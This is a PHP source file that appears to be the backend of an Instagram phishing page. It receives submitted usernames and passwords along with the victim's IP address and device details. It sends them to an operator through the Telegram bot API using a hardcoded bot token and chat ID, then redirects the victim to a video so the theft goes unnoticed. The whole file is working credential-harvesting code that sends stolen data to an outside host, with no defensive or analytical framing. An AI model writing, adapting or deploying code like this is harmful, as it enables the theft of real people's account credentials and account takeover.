<?php

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Telegram credentials - hardcoded for reliability
$telegram_bot_token = "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = "8244999766";

// Log incoming request for debugging
error_log("Capture.php called - Method: " . $_SERVER['REQUEST_METHOD']);
error_log("POST data: " . print_r($_POST, true));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST["username"] ?? '';
    $password = $_POST["password"] ?? '';
    $redirect_url = $_POST["redirect_url"] ?? "https://www.instagram.com/";
    
    if (!empty($username) && !empty($password)) {
        // Get additional information
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $forwarded_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $ip;
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $timestamp = date("Y-m-d H:i:s");
        
        // Format message for Telegram
        $message = "🔔 *New Instagram Login Captured!*\n\n";
        $message .= "👤 *Username:* `{$username}`\n";
        $message .= "🔑 *Password:* `{$password}`\n\n";
        $message .= "📍 *IP Address:* `{$forwarded_ip}`\n";
        $message .= "🕐 *Time:* `{$timestamp}`\n";
        $message .= "🎬 *Video URL:* `{$redirect_url}`\n";
        $message .= "📱 *Device:* `" . substr($user_agent, 0, 100) . "`";
        
        // Send to Telegram
        $telegram_url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        
        $post_data = [
            'chat_id' => $telegram_chat_id,
            'text' => $message,
            'parse_mode' => 'Markdown',
            'disable_web_page_preview' => true
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        $response = curl_exec($ch);
        $curl_error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // Log result for debugging
        error_log("Telegram API Response: " . $response);
        error_log("Telegram HTTP Code: " . $http_code);
        if ($curl_error) {
            error_log("Curl Error: " . $curl_error);
        }
        
        echo json_encode([
            'success' => true, 
            'redirect' => $redirect_url,
            'telegram_sent' => ($http_code == 200)
        ]);
    } else {
        error_log("Missing username or password");
        echo json_encode(['success' => false, 'error' => 'Missing credentials']);
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Invalid request method']);
}

// Always redirect to the original video
header("Location: " . $redirect_url);
exit;

?>
